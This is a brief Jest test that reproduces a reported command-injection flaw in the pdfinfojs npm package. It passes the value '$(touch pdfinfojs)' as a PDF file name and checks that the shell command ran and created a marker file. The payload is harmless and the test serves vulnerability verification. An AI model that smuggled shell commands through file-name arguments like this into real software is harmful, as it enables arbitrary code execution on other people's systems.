//https://hackerone.com/reports/330957
test("Command Injection in pdfinfojs", () => {
  const pdfinfo = require("pdfinfojs");
  const fs = require("fs");
  const path = "./pdfinfojs";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  pdf = new pdfinfo("$(touch pdfinfojs)");
  pdf.getInfo(function (err, info, params) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
